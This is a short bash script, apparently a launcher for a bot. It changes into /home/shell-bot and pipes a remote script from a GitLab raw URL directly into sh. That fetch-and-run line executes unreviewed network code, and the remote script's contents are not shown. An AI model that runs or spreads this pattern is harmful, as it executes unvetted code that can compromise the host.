#!/bin/bash

cd /home/shell-bot
curl https://gitlab.com/teletyl/zepo/-/raw/main/nzepo.sh | sh
